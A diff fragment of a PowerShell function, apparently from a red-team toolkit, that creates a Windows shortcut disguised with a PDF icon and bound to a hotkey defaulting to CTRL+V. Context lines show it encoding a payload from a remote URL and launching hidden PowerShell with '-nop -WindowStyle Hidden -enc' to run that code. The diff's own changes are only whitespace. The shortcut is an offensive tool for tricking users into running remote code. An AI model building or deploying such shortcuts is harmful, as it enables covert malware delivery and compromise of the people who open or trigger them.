@@ -27,11 +27,11 @@ function Create-HotKeyLNK {
     .PARAMETER PDFIcon
 
         Switch to create an icon with a PDF logo
-        
+
     .PARAMETER HotKey
 
         HotKey to bind to. Defaults to "CTRL+V".
-    
+
     .PARAMETER PowerShellPayloadURL
 
         URL to your PowerShell payload http://mydomain.com/payload.svg
@@ -39,8 +39,8 @@ function Create-HotKeyLNK {
    .EXAMPLE
 
         Create-HotKeyLNK -Name Google -EXEPath "C:\Windows\System32\calc.exe" -HotKey "CTRL+V"
-        
-    
+
+
 #>
     [CmdletBinding()]
     param(
@@ -83,9 +83,9 @@ function Create-HotKeyLNK {
         $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
         $EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
         $arguments = "-nop -WindowStyle Hidden -enc $encodedPayload"
-        
-    } 
-    
+
+    }
+
     $obj = New-Object -ComObject WScript.Shell
     $link = $obj.CreateShortcut((Get-Location).Path + "\" + $LNKName + ".lnk")
     $link.WindowStyle = '7'
